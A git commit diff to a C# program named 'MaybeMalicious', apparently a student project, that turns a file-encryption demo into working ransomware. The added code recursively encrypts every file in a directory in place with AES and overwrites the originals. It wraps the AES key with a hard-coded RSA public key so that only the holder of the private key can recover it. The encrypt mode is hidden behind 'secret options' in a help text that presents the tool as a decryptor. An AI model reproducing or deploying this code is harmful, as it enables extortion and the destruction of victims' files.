d54d10cb4929e2cc74fb7db9a73729087077a634
keeperazra <alexander.zimmerman@mymail.champlain.edu>
2021-03-05 21:29:44 -0500

    Implement full command line options

--- Program.cs
+++ Program.cs
@@ -7,7 +7,9 @@ namespace MaybeMalicious
 {
     class Program
     {
-        static void Main(string[] args)
+        public static string rsaPubKey = "MIIBCgKCAQEAyIW7MeJh/YLg45BZROKdBRl7kd3rbf1N+/vDyfluPbgZSfzz4zJ9qmVUGQhGbTBA2VuHkWv8ePXT7e6mWK0nYbePgLvoOfI7IC94EhKNk3Dw3DkKmYhsWA+e0M26RYdzIJsxmZWRBAGOL32MJnu3D+AaciG5+ZjWh+RcPKv7LEsxPWAIEMUpiFJLMnHfmt8ljlZISdNFHZ4n/mekQ6BiLNSlAAh1Nh0ggWAFqSrl/7vsAFnUIxY5UNVsOqU/Sjvsy+mNkyPbZC9QAUNj3QudRBi/zWR5mokIObZ+woGx6/7Nvm3chECgIYhpKOLktA6eSQjYx3X2V4FPW7dgp32BAQIDAQAB";
+
+        public static void Main(string[] args)
         {
             if (args.Length == 0)
             {
@@ -16,25 +18,105 @@ namespace MaybeMalicious
             }
 
             Dictionary<string, string> kwargs = ProcessArgs(args);
+            using AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
 
-            string fileName = kwargs["target"];
-            if (!File.Exists(fileName))
+            if (kwargs["action"] == "encrypt")
             {
-                Console.WriteLine(string.Format("File \"{0}\" does not exist!", fileName));
+                Random r = new Random();
+                byte[] key = new byte[32];
+                r.NextBytes(key);
+                aes.Key = key;
+
+                using RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
+                byte[] rsaPubKeyBytes = Convert.FromBase64String(rsaPubKey);
+                rsa.ImportRSAPublicKey(rsaPubKeyBytes, out int _);
+
+                SaveKey(aes.Key, rsa);
+
+                if (kwargs["type"] == "file")
+                {
+                    EncryptFile(kwargs["target"], aes);
+                }
+                else if (kwargs["type"] == "directory")
+                {
+                    EncryptDirectory(kwargs["target"], aes);
+                }
             }
-            Console.WriteLine("Selecting file: " + fileName);
+            else if (kwargs["action"] == "decrypt")
+            {
+                aes.Key = Convert.FromBase64String(kwargs["key"]);
 
-            Random r = new Random();
-            byte[] key = new byte[32];
-            r.NextBytes(key);
-            using Aes aes = Aes.Create();
-            aes.Key = key;
-
-            EncryptFile(fileName, aes);
-            DecryptFile(fileName, aes);
+                if (kwargs["type"] == "file")
+                {
+                    DecryptFile(kwargs["target"], aes);
+                }
+                else if (kwargs["type"] == "directory")
+                {
+                    DecryptDirectory(kwargs["target"], aes);
+                }
+            }
+            else if (kwargs["action"] == "key")
+            {
+                using RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
+                byte[] rsaPrivKeyBytes = Convert.FromBase64String(kwargs["key"]);
+                rsa.ImportRSAPrivateKey(rsaPrivKeyBytes, out int _);
+                RecoverKey(kwargs["target"], rsa);
+            }
+            else
+            {
+                Console.WriteLine("Unknonw action. Exiting!");
+                return;
+            }
         }
 
-        static Dictionary<string, string> ProcessArgs(string[] args)
+        private static void SaveKey(byte[] key, RSACryptoServiceProvider rsa)
+        {
+            string path = new Uri(System.Reflection.Assembly.GetExecutingAssembly().Location).AbsolutePath;
+            string filePath = Path.Combine(Path.GetDirectoryName(path), "key.enc");
+            byte[] cryptoText = rsa.Encrypt(key, false);
+
+            int c = 0;
+            while (File.Exists(filePath))
+            {
+                c++;
+                filePath = Path.Combine(Path.GetDirectoryName(path), $"key{c}.enc");
+            }
+
+            using FileStream file = new FileStream(filePath, FileMode.Create);
+            file.Write(cryptoText);
+        }
+
+        private static void RecoverKey(string keyPath, RSACryptoServiceProvider rsa)
+        {
+            if (!File.Exists(keyPath))
+            {
+                Console.WriteLine("Cannot find key file to recover at " + keyPath);
+                return;
+            }
+
+            using FileStream keyFile = new FileStream(keyPath, FileMode.Open);
+            byte[] encKey = new byte[keyFile.Length];
+            int bytesRead = 0;
+            while(bytesRead < keyFile.Length)
+            {
+                bytesRead += keyFile.Read(encKey);
+            }
+
+            byte[] key = rsa.Decrypt(encKey, false);
+            string keyText = Convert.ToBase64String(key);
+            Console.WriteLine("Decrypted key: " + keyText);
+
+            string outKeyPath = keyPath + ".dec";
+            int c = 0;
+            while (File.Exists(outKeyPath))
+            {
+                c++;
+                outKeyPath = keyPath + $"{c}.dec";
+            }
+            File.WriteAllText(outKeyPath, keyText);
+        }
+
+        private static Dictionary<string, string> ProcessArgs(string[] args)
         {
             Dictionary<string, string> kwargs = new Dictionary<string, string>
             {
@@ -74,6 +156,9 @@ namespace MaybeMalicious
                     case "-e":
                         kwargs["action"] = "encrypt";
                         break;
+                    case "-r":
+                        kwargs["action"] = "key";
+                        break;
                     default:
                         Console.WriteLine($"Ignoring unknown parameter \"{arg}\"");
                         break;
@@ -82,7 +167,7 @@ namespace MaybeMalicious
             return kwargs;
         }
 
-        static void PrintHelp()
+        private static void PrintHelp()
         {
             Console.WriteLine("Expected syntax: MaybeMalicious [-f | -d] <path> [--key=<key> | --keyfile=<key_file>]");
             Console.WriteLine();
@@ -91,11 +176,11 @@ namespace MaybeMalicious
             Console.WriteLine("-f          to decrypt the specified file using the provided key.");
             Console.WriteLine("-d          to decrypt all the files in the specified directory.");
             Console.WriteLine();
-            Console.WriteLine("Secret options: -e");
-            Console.WriteLine("These will encrypt your files!");
+            Console.WriteLine("Secret options: -e -r");
+            Console.WriteLine("One of these will encrypt your files!");
         }
 
-        static string FetchKeyFromFile(string filePath)
+        private static string FetchKeyFromFile(string filePath)
         {
             if (!File.Exists(filePath))
             {
@@ -108,75 +193,85 @@ namespace MaybeMalicious
             return read.ReadToEnd();
         }
 
-        static void EncryptFile(string filePath, Aes aes)
+        private static void EncryptDirectory(string path, AesCryptoServiceProvider aes)
         {
-            string newFilePath = filePath + ".enc";
-            if (File.Exists(newFilePath))
+            if (!Directory.Exists(path))
             {
-                Console.WriteLine(filePath + " is already encrypted. Skipping!");
+                Console.WriteLine("Cannot find directory " + path);
+                return;
+            }
+            string[] files = Directory.GetFiles(path, "*", SearchOption.AllDirectories);
+            foreach(string file in files)
+            {
+                EncryptFile(file, aes);
+            }
+        }
+
+        private static void EncryptFile(string filePath, AesCryptoServiceProvider aes)
+        {
+            if (!File.Exists(filePath))
+            {
+                Console.WriteLine("Could not find file: " + filePath);
                 return;
             }
 
-            using FileStream file = new FileStream(filePath, FileMode.Open);
-            byte[] bytes = GetBytes(file);
-            int bytesToWrite = bytes.Length;
+            aes.GenerateIV();
 
-            using FileStream newFile = new FileStream(newFilePath, FileMode.Create);
+            // Generate temporary file
+            string tempFile = Path.GetTempFileName();
+            File.Copy(filePath, tempFile, true);
+
+            using FileStream file = new FileStream(tempFile, FileMode.Open);
+            using FileStream newFile = new FileStream(filePath, FileMode.Truncate);
+            // Write IV to file so it can be decrypted later
             newFile.Write(aes.IV, 0, aes.IV.Length);
             using CryptoStream crypto = new CryptoStream(newFile, aes.CreateEncryptor(), CryptoStreamMode.Write);
-            crypto.Write(bytes, 0, bytesToWrite);
+            file.CopyTo(crypto);
+            crypto.FlushFinalBlock();
 
             Console.WriteLine("Encrypted file " + filePath);
+            file.Close();
+            File.Delete(tempFile);
         }
 
-        static void DecryptFile(string filePath, Aes aes)
+        private static void DecryptDirectory(string path, AesCryptoServiceProvider aes)
         {
-            string encFilePath = filePath + ".enc";
-            string decFilePath = filePath + ".dec";
-            if (!File.Exists(encFilePath))
+            if (!Directory.Exists(path))
             {
-                Console.WriteLine("Cannot find encrypted file " + encFilePath);
+                Console.WriteLine("Cannot find directory " + path);
                 return;
             }
-            if (File.Exists(decFilePath))
+            string[] files = Directory.GetFiles(path, "*", SearchOption.AllDirectories);
+            foreach (string file in files)
             {
-                Console.WriteLine("File has already been decrypted to " + decFilePath);
-                return;
+                DecryptFile(file, aes);
             }
+        }
 
-            using FileStream encFile = new FileStream(encFilePath, FileMode.Open);
+        private static void DecryptFile(string filePath, AesCryptoServiceProvider aes)
+        {
+            if (!File.Exists(filePath))
+            {
+                Console.WriteLine("Cannot find encrypted file " + filePath);
+                return;
+            }
+            // Create temporary file to work with
+            string tmpFile = Path.GetTempFileName();
+            File.Copy(filePath, tmpFile, true);
+
+            using FileStream encFile = new FileStream(tmpFile, FileMode.Open);
+            // Load IV from encrypted file
+            byte[] iv = new byte[aes.IV.Length];
+            encFile.Read(iv, 0, aes.IV.Length);
+            aes.IV = iv;
             encFile.Seek(aes.IV.Length, SeekOrigin.Begin);
+            // Create crypto stream and copy decrypted file to original file
             using CryptoStream crypto = new CryptoStream(encFile, aes.CreateDecryptor(), CryptoStreamMode.Read);
-            using FileStream decFile = new FileStream(decFilePath, FileMode.Create);
+            using FileStream decFile = new FileStream(filePath, FileMode.Truncate);
             crypto.CopyTo(decFile);
-        }
-
-        static byte[] GetBytes(Stream stream)
-        {
-            byte[] bytes;
-            try
-            {
-                bytes = new byte[stream.Length];
-                int bytesToRead = (int)stream.Length;
-                int bytesRead = 0;
-
-                while (bytesToRead > 0)
-                {
-                    int n = stream.Read(bytes, bytesRead, bytesToRead);
-
-                    if (n == 0)
-                        break;
-
-                    bytesRead += n;
-                    bytesToRead -= n;
-                }
-            }
-            catch
-            {
-                Console.WriteLine("Stream reading failed!");
-                throw;
-            }
-            return bytes;
+            crypto.Close();
+            encFile.Close();
+            File.Delete(tmpFile);
         }
     }
 }
